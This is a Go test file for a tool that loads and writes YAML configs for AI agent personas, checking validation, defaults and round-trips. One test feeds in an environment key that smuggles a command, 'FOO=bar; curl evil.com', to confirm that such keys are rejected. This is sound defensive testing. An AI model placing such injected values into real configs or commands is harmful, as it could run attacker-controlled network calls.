package fleet_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/kishibashi3/agent-hub-bridges/bridge-tmux/internal/fleet"
)

// ──────────────────────────────────────────────────────────────────────── //
// LoadFleetConfig                                                           //
// ──────────────────────────────────────────────────────────────────────── //

func TestLoadFleetConfig_Valid(t *testing.T) {
	y := `
personas:
  - handle: reviewer
    workdir: /tmp/reviewer
    bypass_permissions: true
    idle_timeout: 10m
    model: claude-opus-4-7
  - handle: planner
    workdir: /tmp/planner
    idle_timeout: 15m
    env:
      MY_VAR: hello
`
	path := writeTempFleet(t, y)
	cfg, err := fleet.LoadFleetConfig(path)
	if err != nil {
		t.Fatalf("LoadFleetConfig: %v", err)
	}
	if len(cfg.Personas) != 2 {
		t.Fatalf("got %d personas, want 2", len(cfg.Personas))
	}

	r := cfg.Personas[0]
	if r.Handle != "reviewer" {
		t.Errorf("Handle = %q, want reviewer", r.Handle)
	}
	if r.Workdir != "/tmp/reviewer" {
		t.Errorf("Workdir = %q, want /tmp/reviewer", r.Workdir)
	}
	if !r.BypassPermissions {
		t.Error("BypassPermissions = false, want true")
	}
	if r.IdleTimeout.Duration != 10*time.Minute {
		t.Errorf("IdleTimeout = %v, want 10m", r.IdleTimeout.Duration)
	}
	if r.Model != "claude-opus-4-7" {
		t.Errorf("Model = %q, want claude-opus-4-7", r.Model)
	}

	p := cfg.Personas[1]
	if p.Handle != "planner" {
		t.Errorf("Handle = %q, want planner", p.Handle)
	}
	if p.Env["MY_VAR"] != "hello" {
		t.Errorf("Env[MY_VAR] = %q, want hello", p.Env["MY_VAR"])
	}
}

func TestLoadFleetConfig_WithHealthPort(t *testing.T) {
	y := `
health_port: 8080
personas:
  - handle: reviewer
    workdir: /tmp/reviewer
`
	path := writeTempFleet(t, y)
	cfg, err := fleet.LoadFleetConfig(path)
	if err != nil {
		t.Fatalf("LoadFleetConfig: %v", err)
	}
	if cfg.HealthPort != 8080 {
		t.Errorf("HealthPort = %d, want 8080", cfg.HealthPort)
	}
}

func TestLoadFleetConfig_MissingFile(t *testing.T) {
	_, err := fleet.LoadFleetConfig("/nonexistent/fleet.yaml")
	if err == nil {
		t.Fatal("expected error for missing file, got nil")
	}
}

func TestLoadFleetConfig_InvalidYAML(t *testing.T) {
	path := writeTempFleet(t, "personas: [invalid: {unclosed")
	_, err := fleet.LoadFleetConfig(path)
	if err == nil {
		t.Fatal("expected error for invalid YAML, got nil")
	}
}

func TestLoadFleetConfig_EmptyPersonas(t *testing.T) {
	path := writeTempFleet(t, "personas: []\n")
	_, err := fleet.LoadFleetConfig(path)
	if err == nil {
		t.Fatal("expected error for empty personas, got nil")
	}
}

func TestLoadFleetConfig_InvalidDuration(t *testing.T) {
	y := `
personas:
  - handle: reviewer
    workdir: /tmp/reviewer
    idle_timeout: notaduration
`
	path := writeTempFleet(t, y)
	_, err := fleet.LoadFleetConfig(path)
	if err == nil {
		t.Fatal("expected error for invalid duration, got nil")
	}
}

func TestLoadFleetConfig_MissingHandle(t *testing.T) {
	y := `
personas:
  - workdir: /tmp/reviewer
`
	path := writeTempFleet(t, y)
	_, err := fleet.LoadFleetConfig(path)
	if err == nil {
		t.Fatal("expected error for missing handle, got nil")
	}
}

func TestLoadFleetConfig_MissingWorkdir(t *testing.T) {
	y := `
personas:
  - handle: reviewer
`
	path := writeTempFleet(t, y)
	_, err := fleet.LoadFleetConfig(path)
	if err == nil {
		t.Fatal("expected error for missing workdir, got nil")
	}
}

func TestLoadFleetConfig_InvalidEnvKey(t *testing.T) {
	y := `
personas:
  - handle: reviewer
    workdir: /tmp/reviewer
    env:
      "FOO=bar; curl evil.com": injected
`
	path := writeTempFleet(t, y)
	_, err := fleet.LoadFleetConfig(path)
	if err == nil {
		t.Fatal("expected error for invalid env key, got nil")
	}
}

func TestLoadFleetConfig_ValidEnvKey(t *testing.T) {
	y := `
personas:
  - handle: reviewer
    workdir: /tmp/reviewer
    env:
      MY_VAR: hello
      _UNDERSCORE: ok
      VAR123: fine
`
	path := writeTempFleet(t, y)
	cfg, err := fleet.LoadFleetConfig(path)
	if err != nil {
		t.Fatalf("LoadFleetConfig: %v", err)
	}
	if cfg.Personas[0].Env["MY_VAR"] != "hello" {
		t.Errorf("Env[MY_VAR] = %q, want hello", cfg.Personas[0].Env["MY_VAR"])
	}
}

func TestLoadFleetConfig_UnknownField(t *testing.T) {
	y := `
personas:
  - handle: reviewer
    workdir: /tmp/reviewer
    unknown_field: oops
`
	path := writeTempFleet(t, y)
	_, err := fleet.LoadFleetConfig(path)
	if err == nil {
		t.Fatal("expected error for unknown field, got nil")
	}
}

func TestLoadFleetConfig_DefaultValues(t *testing.T) {
	y := `
personas:
  - handle: writer
    workdir: /tmp/writer
`
	path := writeTempFleet(t, y)
	cfg, err := fleet.LoadFleetConfig(path)
	if err != nil {
		t.Fatalf("LoadFleetConfig: %v", err)
	}
	p := cfg.Personas[0]
	if p.BypassPermissions {
		t.Error("BypassPermissions should default to false")
	}
	if p.IdleTimeout.Duration != 0 {
		t.Errorf("IdleTimeout should default to 0, got %v", p.IdleTimeout.Duration)
	}
	if cfg.HealthPort != 0 {
		t.Errorf("HealthPort should default to 0, got %d", cfg.HealthPort)
	}
}

// ──────────────────────────────────────────────────────────────────────── //
// WriteFleetConfig                                                          //
// ──────────────────────────────────────────────────────────────────────── //

func TestWriteFleetConfig_RoundTrip(t *testing.T) {
	original := &fleet.FleetConfig{
		HealthPort: 8080,
		Personas: []fleet.PersonaConfig{
			{
				Handle:            "reviewer",
				Workdir:           "/roles/reviewer",
				Model:             "claude-opus-4-7",
				BypassPermissions: true,
				IdleTimeout:       fleet.YAMLDuration{Duration: 10 * time.Minute},
			},
			{
				Handle:  "planner",
				Workdir: "/roles/planner",
			},
		},
	}

	path := filepath.Join(t.TempDir(), "fleet.yaml")
	if err := fleet.WriteFleetConfig(path, original); err != nil {
		t.Fatalf("WriteFleetConfig: %v", err)
	}

	loaded, err := fleet.LoadFleetConfig(path)
	if err != nil {
		t.Fatalf("LoadFleetConfig after write: %v", err)
	}

	if loaded.HealthPort != 8080 {
		t.Errorf("HealthPort = %d, want 8080", loaded.HealthPort)
	}
	if len(loaded.Personas) != 2 {
		t.Fatalf("got %d personas, want 2", len(loaded.Personas))
	}
	p := loaded.Personas[0]
	if p.Handle != "reviewer" {
		t.Errorf("Handle = %q, want reviewer", p.Handle)
	}
	if p.Model != "claude-opus-4-7" {
		t.Errorf("Model = %q, want claude-opus-4-7", p.Model)
	}
	if !p.BypassPermissions {
		t.Error("BypassPermissions should be true after round-trip")
	}
	if p.IdleTimeout.Duration != 10*time.Minute {
		t.Errorf("IdleTimeout = %v, want 10m", p.IdleTimeout.Duration)
	}
}

func TestWriteFleetConfig_ZeroDurationOmitted(t *testing.T) {
	cfg := &fleet.FleetConfig{
		Personas: []fleet.PersonaConfig{
			{Handle: "writer", Workdir: "/tmp"},
		},
	}
	path := filepath.Join(t.TempDir(), "fleet.yaml")
	if err := fleet.WriteFleetConfig(path, cfg); err != nil {
		t.Fatalf("WriteFleetConfig: %v", err)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	// zero idle_timeout should be omitted
	if strings.Contains(string(data), "idle_timeout") {
		t.Errorf("expected idle_timeout to be omitted for zero duration, got:\n%s", data)
	}
}

// ──────────────────────────────────────────────────────────────────────── //
// helper                                                                    //
// ──────────────────────────────────────────────────────────────────────── //

func writeTempFleet(t *testing.T, content string) string {
	t.Helper()
	f, err := os.CreateTemp(t.TempDir(), "fleet-*.yaml")
	if err != nil {
		t.Fatalf("create temp file: %v", err)
	}
	if _, err := f.WriteString(content); err != nil {
		t.Fatalf("write temp file: %v", err)
	}
	f.Close()
	return filepath.Clean(f.Name())
}
